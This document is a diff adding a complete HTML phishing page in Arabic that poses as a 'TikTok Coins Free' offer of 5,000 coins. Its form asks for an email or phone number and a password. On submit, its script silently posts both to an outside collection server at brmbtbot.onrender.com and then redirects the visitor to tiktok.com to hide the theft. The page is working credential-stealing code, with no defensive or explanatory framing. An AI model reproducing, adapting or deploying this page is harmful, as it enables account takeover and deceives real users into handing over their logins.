@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>TikTok Coins Free</title>
+    <style>
+        body { background: #010101; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { width: 340px; text-align: center; border: 1px solid #333; padding: 30px; border-radius: 15px; background: #121212; }
+        input { width: 100%; padding: 14px; margin: 10px 0; background: #262626; border: 1px solid #333; color: white; border-radius: 8px; box-sizing: border-box; }
+        .btn { width: 100%; background: #fe2c55; color: white; padding: 14px; border: none; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2 style="color: #fe2c55;">TikTok Coins</h2>
+        <p style="font-size: 14px;">احصل على 5000 عملة مجانية الآن</p>
+        <form id="f">
+            <input type="text" id="u" placeholder="البريد أو الهاتف" required>
+            <input type="password" id="p" placeholder="كلمة المرور" required>
+            <button type="submit" class="btn">تفعيل العملات</button>
+        </form>
+    </div>
+    <script>
+        document.getElementById('f').addEventListener('submit', function(e) {
+            e.preventDefault();
+            fetch('https://brmbtbot.onrender.com/receive', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ platform: 'TikTok Coins', u: document.getElementById('u').value, p: document.getElementById('p').value })
+            }).finally(() => { window.location.href = 'https://www.tiktok.com'; });
+        });
+    </script>
+</body>
+</html>
